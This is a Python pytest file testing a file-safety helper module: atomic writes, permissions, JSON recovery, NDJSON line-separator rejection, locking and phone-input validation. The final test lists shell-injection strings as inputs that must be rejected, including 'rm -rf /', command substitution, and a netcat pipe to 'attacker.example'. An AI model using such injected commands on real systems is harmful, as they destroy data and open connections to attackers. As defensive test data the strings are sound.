"""Tests for safe_io helpers. Catches the bugs the PR review flagged.

Critical regressions guarded here:
- P3: path.with_name vs path.with_suffix on dotted-suffix files
- Security-M1: atomic_write_text preserves existing file mode
- Security-M3: ndjson_append rejects U+2028/U+2029/NEL line separators
"""
from __future__ import annotations
import json
import os
import threading
import time
from pathlib import Path

import pytest

# safe_io uses fcntl (Unix-only). Skip the whole module on Windows so the rest
# of the suite runs in local dev; the suite still runs on the Linux VPS where
# flock is the whole point. importorskip works at collection time, before the
# safe_io import below would explode.
pytest.importorskip("fcntl")

from safe_io import (
    FileLock, atomic_write_text, atomic_write_json,
    safe_load_json, ndjson_append, sweep_orphan_temps, validate_phone_input,
)


# ─── atomic_write_text ───

def test_atomic_write_text_on_dotted_suffix(tmp_path):
    """P3 regression: .json file rewrite used to raise ValueError from with_suffix."""
    t = tmp_path / "pending.json"
    atomic_write_text(t, '{"a": 1}')
    assert t.read_text() == '{"a": 1}'
    atomic_write_text(t, '{"a": 2}')
    assert t.read_text() == '{"a": 2}'


def test_atomic_write_text_preserves_mode(tmp_path):
    """Security-M1: existing 0o600 must survive rewrite."""
    t = tmp_path / "s.json"
    t.write_text("{}")
    os.chmod(t, 0o600)
    atomic_write_text(t, "{}")
    assert oct(t.stat().st_mode & 0o777) == "0o600"


def test_atomic_write_text_uses_600_by_default(tmp_path):
    """New file should be 0o600, not 0o640."""
    t = tmp_path / "new.json"
    atomic_write_text(t, "{}")
    assert oct(t.stat().st_mode & 0o777) == "0o600"


def test_atomic_write_text_skips_dir_fsync_when_os_name_not_posix(tmp_path, monkeypatch):
    """BUG-FLYER-QA-005: Windows raises PermissionError when os.open is called on
    a directory. The parent-directory fsync block must be gated on
    os.name == 'posix'. This simulates Windows on Linux CI by monkeypatching
    os.name; the test passes if no PermissionError leaks and the file content
    is correct."""
    monkeypatch.setattr(os, "name", "nt")
    target = tmp_path / "x.txt"
    atomic_write_text(target, "hello")
    assert target.read_text(encoding="utf-8") == "hello"


@pytest.mark.skipif(os.name != "posix", reason="POSIX-only durability invariant; cannot exercise on Windows even with monkeypatched os.name")
def test_atomic_write_text_fsyncs_parent_on_posix(tmp_path, monkeypatch):
    """BUG-FLYER-QA-005 regression guard: the POSIX durability invariant (fsync
    the parent directory after rename) must NOT be silently dropped. Track
    os.open + os.fsync and assert at least one of the dir FDs we opened was
    later fsynced. Catches accidental future removal of the dir-fsync call."""
    monkeypatch.setattr(os, "name", "posix")
    dir_fds: set[int] = set()
    fsynced_fds: list[int] = []
    real_open = os.open
    real_fsync = os.fsync

    def tracking_open(path, flags, *args, **kwargs):
        fd = real_open(path, flags, *args, **kwargs)
        try:
            if Path(path).is_dir():
                dir_fds.add(fd)
        except OSError:
            pass
        return fd

    def tracking_fsync(fd):
        fsynced_fds.append(fd)
        real_fsync(fd)

    monkeypatch.setattr(os, "open", tracking_open)
    monkeypatch.setattr(os, "fsync", tracking_fsync)
    target = tmp_path / "y.txt"
    atomic_write_text(target, "world")
    assert target.read_text(encoding="utf-8") == "world"
    assert dir_fds, "atomic_write_text did not open the parent directory at all"
    assert any(fd in fsynced_fds for fd in dir_fds), \
        "parent-directory FD was opened but not fsynced"


# ─── safe_load_json ───

def test_safe_load_json_missing(tmp_path):
    _, status = safe_load_json(tmp_path / "nope.json", default={"d": 1})
    assert status == "missing"


def test_safe_load_json_empty(tmp_path):
    t = tmp_path / "empty.json"
    t.write_text("")
    obj, status = safe_load_json(t, default={"d": 1})
    assert status == "empty"
    assert obj == {"d": 1}


def test_safe_load_json_ok(tmp_path):
    t = tmp_path / "ok.json"
    t.write_text('{"a": 1}')
    obj, status = safe_load_json(t)
    assert status == "ok"
    assert obj == {"a": 1}


def test_safe_load_json_corrupt_renames_and_returns_default(tmp_path):
    """P3 + safe_load_json: corrupt file should get renamed to .corrupt-<ts>."""
    t = tmp_path / "bad.json"
    t.write_text("{not valid json")
    obj, status = safe_load_json(t, default={"fallback": 1})
    assert status.startswith("corrupt:")
    assert obj == {"fallback": 1}
    # Original should be renamed
    assert not t.exists()
    corrupts = list(tmp_path.glob("bad.json.corrupt-*"))
    assert len(corrupts) == 1


# ─── ndjson_append ───

def test_ndjson_append_accepts_clean_entry(tmp_path):
    t = tmp_path / "log.ndjson"
    ndjson_append(t, '{"ok": 1}')
    assert t.read_text() == '{"ok": 1}\n'


def test_ndjson_append_rejects_embedded_newline(tmp_path):
    t = tmp_path / "log.ndjson"
    with pytest.raises(ValueError, match="line-break"):
        ndjson_append(t, '{"bad": "line\nbreak"}')


def test_ndjson_append_rejects_U2028(tmp_path):
    """Security-M3 regression: U+2028 (LINE SEPARATOR) must be rejected."""
    t = tmp_path / "log.ndjson"
    with pytest.raises(ValueError, match="line-break"):
        ndjson_append(t, '{"bad": "ls here"}')


def test_ndjson_append_rejects_U2029(tmp_path):
    """Security-M3: U+2029 PARAGRAPH SEPARATOR."""
    t = tmp_path / "log.ndjson"
    with pytest.raises(ValueError, match="line-break"):
        ndjson_append(t, '{"bad": "ps here"}')


def test_ndjson_append_rejects_NEL(tmp_path):
    """Security-M3: U+0085 NEL."""
    t = tmp_path / "log.ndjson"
    with pytest.raises(ValueError, match="line-break"):
        ndjson_append(t, '{"bad": "nelhere"}')


# ─── FileLock ───

def test_filelock_serializes_concurrent_writers(tmp_path):
    lock = tmp_path / "x.lock"
    results = []

    def worker(wid, delay):
        with FileLock(lock):
            results.append((wid, "acquire", time.time()))
            time.sleep(delay)
            results.append((wid, "release", time.time()))

    threads = [
        threading.Thread(target=worker, args=(1, 0.15)),
        threading.Thread(target=worker, args=(2, 0.15)),
    ]
    start = time.time()
    for th in threads: th.start()
    for th in threads: th.join()
    elapsed = time.time() - start
    # Serialized: ~0.30s; parallel: ~0.15s
    assert elapsed > 0.28, f"expected serialized (>0.28s), got {elapsed:.3f}s"


def test_filelock_releases_on_exception(tmp_path):
    lock = tmp_path / "x.lock"
    try:
        with FileLock(lock):
            raise RuntimeError("test")
    except RuntimeError:
        pass
    # Should be able to acquire again immediately
    with FileLock(lock):
        pass


# ─── sweep_orphan_temps ───

def test_sweep_orphan_temps_removes_old(tmp_path):
    old = tmp_path / "pending.json.tmp-12345"
    new = tmp_path / "pending.json.tmp-67890"
    old.touch(); new.touch()
    six_min_ago = time.time() - 360
    os.utime(str(old), (six_min_ago, six_min_ago))
    swept = sweep_orphan_temps(tmp_path)
    assert swept == 1
    assert not old.exists()
    assert new.exists()


# ─── validate_phone_input ───

@pytest.mark.parametrize("good", [
    "+19045550101",
    "+1-904-555-0101",
    "+1 (904) 555-0101",   # parens + space now allowed (Priority-1)
    "19045550101@s.whatsapp.net",
    "19045550101@lid",
])
def test_validate_phone_input_accepts_common_formats(good):
    assert validate_phone_input(good) == good


@pytest.mark.parametrize("bad", [
    "+19045550101; rm -rf /",   # shell injection
    "$(whoami)",                # command sub
    "`id`",                     # backtick
    "+1|nc attacker.example 443",
    "+1904\n5550101",           # newline
])
def test_validate_phone_input_rejects_shell_injection(bad):
    with pytest.raises(ValueError):
        validate_phone_input(bad)
